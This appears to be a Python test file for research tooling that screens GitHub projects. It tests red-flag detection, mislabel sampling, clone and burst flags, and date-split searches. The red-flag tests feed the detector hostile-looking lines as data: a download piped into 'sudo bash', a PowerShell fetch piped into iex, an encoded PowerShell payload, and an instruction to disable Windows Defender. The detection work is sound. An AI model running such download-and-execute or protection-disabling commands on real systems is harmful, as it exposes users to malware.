"""X25 checks (author's decisions, 5 Nov 2026; issue #70): red flags, mislabel sample,
copy and burst flags, date-split searches. No code is downloaded or run."""
import datetime as dt

from snapshot.research import github_tools as G
from snapshot.research import x25_checks as X


def test_red_flags_find_each_kind_and_leave_plain_text_alone():
    assert X.red_flags("pip install mytool\nRun `mytool --help`.") == []
    t = "curl -sSL https://x.example/install.sh | sudo bash"
    assert X.red_flags(t) == ["download piped into a shell"]
    assert "download piped into a shell" in X.red_flags("iwr https://x.example/a.ps1 | iex")
    assert "encoded payload" in X.red_flags("powershell -enc SQBFAFgA")
    assert "encoded payload" in X.red_flags("A" * 400)
    assert "antivirus or OS-protection bypass" in X.red_flags("First, disable Windows Defender real-time protection.")
    assert "password-protected archive" in X.red_flags("Download the release zip, password: infected")
    assert X.red_flags("", size_kb=900_000) == ["oversized repository"]


def _rows():
    rows = []
    for i in range(40):
        rows.append({"full_name": f"org{i}/tool{i}", "group": ["offensive", "defensive", "dual_use"][i % 3],
                     "is_fork": False, "created": "2026-10-01", "stars": i, "description": f"tool number {i}"})
    return rows


def test_mislabel_sample_is_reproducible_stratified_and_blank_for_the_checker():
    a = X.mislabel_sample(_rows(), 12, seed="2026-11-17")
    b = X.mislabel_sample(_rows(), 12, seed="2026-11-17")
    assert [r["full_name"] for r in a] == [r["full_name"] for r in b]
    assert len(a) == 12 and {r["group"] for r in a} == {"offensive", "defensive", "dual_use"}
    assert all(r["check_group_ok"] == "" for r in a)


def test_error_rate_with_interval():
    rows = [{"check_types_ok": "yes", "check_group_ok": "yes", "check_ai_use_ok": "yes"}] * 45 + \
           [{"check_types_ok": "no", "check_group_ok": "yes", "check_ai_use_ok": "yes"}] * 5
    e = X.error_rate(rows)
    assert e["checked"] == 50 and e["wrong"] == 5 and e["rate"] == 0.1 and e["lo"] < 0.1 < e["hi"]


def test_clone_flags_catch_renamed_copies_only():
    d = "An autonomous AI pentesting agent that finds and exploits web vulnerabilities"
    rows = [{"full_name": "a/strike", "description": d, "created": "2026-01-01"},
            {"full_name": "b/strike-pro", "description": d, "created": "2026-03-01"},
            {"full_name": "c/strike", "description": d, "created": "2026-04-01"},
            {"full_name": "d/other", "description": "short", "created": "2026-04-01"}]
    f = X.clone_flags(rows)
    assert f == {"b/strike-pro": "renamed copy of a/strike"}


def test_burst_owners_and_new_accounts():
    rows = [{"full_name": f"spree/p{i}", "created": f"2026-10-0{i + 1}"} for i in range(4)] + \
           [{"full_name": "slow/p1", "created": "2026-01-01"}, {"full_name": "slow/p2", "created": "2026-06-01"},
            {"full_name": "slow/p3", "created": "2026-10-01"}]
    assert X.burst_owners(rows) == {"spree": 4}
    assert X.new_account("2026-09-20T00:00:00Z", "2026-10-01")
    assert not X.new_account("2020-01-01T00:00:00Z", "2026-10-01")


def test_star_bursts():
    rows = [{"full_name": "a/hot", "created": "2026-11-01", "stars": 2000},
            {"full_name": "b/old", "created": "2025-01-01", "stars": 50000},
            {"full_name": "c/slow", "created": "2026-11-01", "stars": 100}]
    assert X.star_bursts(rows, dt.date(2026, 11, 17)) == ["a/hot"]


def test_search_all_splits_by_date_under_the_cap():
    G.SPLITS.clear()
    # 2,400 projects spread evenly over 2008-2026: the full search is capped, halves are not enough
    total = 2400

    def count_fn(q, pause):
        if "created:" not in q:
            return total
        lo, hi = q.split("created:")[1].split("..")
        a, b = dt.date.fromisoformat(lo), dt.date.fromisoformat(hi)
        span = (dt.date(2026, 11, 17) - dt.date(2008, 1, 1)).days
        return int(total * ((b - a).days + 1) / span)

    calls = []

    def search_fn(q, pause):
        calls.append(q)
        return [{"full_name": f"x/{q}"}]

    out = G.search_all("ai pentest", 0, count_fn, search_fn, dt.date(2008, 1, 1), dt.date(2026, 11, 17))
    assert G.SPLITS == ["ai pentest"] and len(calls) >= 3
    assert all("created:" in q and count_fn(q, 0) <= 1000 for q in calls)
    assert len(out) == len(calls)


def test_search_all_leaves_small_searches_alone():
    G.SPLITS.clear()
    out = G.search_all("rare", 0, lambda q, p: 10, lambda q, p: [{"full_name": "a/b"}])
    assert out == [{"full_name": "a/b"}] and G.SPLITS == []
